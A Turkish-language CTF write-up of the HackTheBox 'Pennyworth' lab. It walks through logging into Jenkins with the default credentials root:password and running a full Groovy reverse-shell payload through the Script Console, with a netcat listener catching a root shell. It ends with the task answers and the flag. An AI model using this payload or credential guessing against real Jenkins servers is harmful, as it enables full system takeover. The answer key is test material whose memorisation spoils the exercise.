# HackTheBox — Pennyworth Writeup

**Zorluk:** Very Easy
**İşletim Sistemi:** Linux
**Hedef IP:** 10.129.184.209
**Saldırgan IP:** 10.10.14.156

---

## 1. Keşif (Reconnaissance)

Her zamanki gibi işe kapsamlı bir Nmap taramasıyla başlıyorum:

```bash
nmap -sS -A -p- -T5 10.129.184.209
```

**Çıktı:**

```
Not shown: 65388 closed tcp ports (reset), 146 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(9.4.39.v20210325)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
```

Hedefte tek bir port açık: **8080/tcp**, üzerinde **Jetty 9.4.39** web sunucusu çalışıyor. Jetty, Java tabanlı uygulamalar için sıkça kullanılan bir servlet konteyneri/web sunucusu — bu da bana Java ekosisteminde bir şey (Jenkins, Tomcat, vb.) çalışıyor olabileceği fikrini veriyor.

---

## 2. Web Servisinin İncelenmesi — Jenkins Tespiti

Tarayıcıdan `http://10.129.184.209:8080` adresine gidiyorum. Karşıma bir **Jenkins** giriş sayfası çıkıyor. Sayfanın en altında sürüm bilgisi de açıkça yazıyor:

```
Jenkins 2.289.1
```

Jenkins, CI/CD (Continuous Integration/Continuous Deployment) süreçlerinde yaygın kullanılan bir otomasyon sunucusu. Yanlış yapılandırılmış veya varsayılan kimlik bilgileriyle bırakılmış Jenkins kurulumları, genellikle doğrudan **Remote Code Execution (RCE)**'a giden çok kısa bir yol sunar — çünkü Jenkins'in yerleşik **Script Console** özelliği, yetkili kullanıcının sunucu üzerinde keyfi Groovy kodu çalıştırmasına izin verir.

---

## 3. Kimlik Doğrulama — Varsayılan Kimlik Bilgileri

Login ekranında ilk aklıma gelen, Jenkins'te sıkça karşılaşılan varsayılan/zayıf kimlik bilgilerini denemek. Birkaç yaygın kombinasyon denedikten sonra:

```
Kullanıcı adı: root
Parola:        password
```

ile başarılı bir şekilde giriş yapabiliyorum. Bu, Jenkins panelinin hiç sertleştirilmemiş (hardening yapılmamış), fabrika ayarlarına yakın bırakıldığını gösteriyor — gerçek dünyada da sıkça karşılaşılan bir yanlış yapılandırma türü.

---

## 4. Script Console Üzerinden RCE

Giriş yaptıktan sonra doğrudan Jenkins'in Script Console adresine gidiyorum:

```
http://10.129.184.209:8080/script
```

Sayfa beni şu mesajla karşılıyor:

> Type in an arbitrary **Groovy script** and execute it on the server.

Bu, tam olarak beklediğim şey: yetkili bir kullanıcı olarak sunucu üzerinde doğrudan Groovy (dolayısıyla JVM üzerinden herhangi bir sistem komutu) çalıştırabiliyorum. Groovy tabanlı bir **reverse shell** payload'ı arıyorum ve şu kaynağa ulaşıyorum:

> https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell

Kullandığım payload:

```groovy
String host="10.10.14.156";
int port=4444;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

`host` değişkenini kendi (attacker) IP'me, `port` değişkenini de dinleyeceğim porta göre ayarlıyorum.

---

## 5. Listener Hazırlığı ve Shell Alımı

Payload'ı göndermeden önce kendi makinemde bir Netcat listener açıyorum:

```bash
nc -nvlp 4444
```

Ardından Groovy script'ini Jenkins Script Console'daki metin kutusuna yapıştırıp **Run** butonuna basıyorum.

**Sonuç:**

```
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.156] from (UNKNOWN) [10.129.184.209] 60674
```

Bağlantı geldi — shell'im hazır. Hemen kim olduğumu kontrol ediyorum:

```bash
whoami
```

```
root
```

Jenkins servisinin doğrudan **root** yetkisiyle çalıştırıldığını görüyorum — büyük bir yanlış yapılandırma. Normalde bu tür servisler düşük yetkili, dedicated bir servis hesabıyla (örn. `jenkins`) çalıştırılmalı; root olarak çalıştırılması, servisteki herhangi bir zafiyetin doğrudan tam sistem ele geçirilmesiyle sonuçlanmasına yol açıyor — tam olarak burada olduğu gibi.

---

## 6. Flag'in Ele Geçirilmesi

Root yetkim olduğu için doğrudan root'un home dizinine gidip flag'i okuyorum:

```bash
cd /root
ls
```

```
flag.txt
snap
```

```bash
cat flag.txt
```

```
9cdfb439c7876e703e307864c9167a15
```

Flag başarıyla elde edildi. 🎉

---

## 7. Özet — Atak Zinciri

1. Nmap taramasıyla yalnızca 8080/tcp (Jetty 9.4.39) portunun açık olduğu tespit edildi.
2. Bu portta bir **Jenkins 2.289.1** kurulumunun çalıştığı keşfedildi.
3. Varsayılan/zayıf kimlik bilgileri (`root:password`) denenerek panele giriş sağlandı.
4. Jenkins'in `/script` adresindeki **Groovy Script Console** özelliği kullanılarak sunucu üzerinde kod çalıştırma imkânı elde edildi.
5. Groovy tabanlı bir **reverse shell** payload'ı hazırlanıp saldırgan IP/portuna göre düzenlendi.
6. Netcat listener açılıp payload çalıştırıldı ve bağlantı elde edildi.
7. `whoami` ile servisin root yetkisiyle çalıştığı doğrulandı.
8. `/root/flag.txt` dosyası okunarak flag ele geçirildi.

---

## 8. Görev Soruları ve Cevapları

**Görev 1 — CVE kısaltması ne anlama geliyor?**
Common Vulnerabilities and Exposures

**Görev 2 — Siber güvenlikteki CIA üçlüsüne atıfta bulunan CIA'deki üç harf neyi temsil eder?**
Confidentiality, Integrity, Availability

**Görev 3 — 8080 portunda çalışan servisin sürümü nedir?**
Jetty 9.4.39.v20210325

**Görev 4 — Hedef sistemde hangi Jenkins sürümü çalışıyor?**
Jenkins 2.289.1

**Görev 5 — Jenkins Komut Dosyası Konsolu'nda girdi olarak hangi tür komut dosyaları kabul edilir?**
Groovy

**Görev 6 — Jenkins komut dosyası konsolunun yolu nedir?**
`/script`

**Görev 7 — `ip a` — Linux'ta ağ arayüzlerimizin bilgilerini görüntülemek için kullanabileceğimiz farklı bir komut nedir?**
ifconfig

**Görev 8 — Netcat'in UDP taşıma modunu kullanması için hangi anahtarı kullanmalıyız?**
`-u`

**Task 9 — What is the term used to describe making a target host initiate a connection back to the attacker host and then accepting commands and executing them?**
Reverse shell

**Tek Bayrak Gönder — Submit the flag located in root's home directory.**
`9cdfb439c7876e703e307864c9167a15`

---

*Not: Bu writeup eğitim/CTF amaçlıdır. Tüm işlemler yalnızca HackTheBox'ın izin verdiği laboratuvar ortamında gerçekleştirilmiştir.*
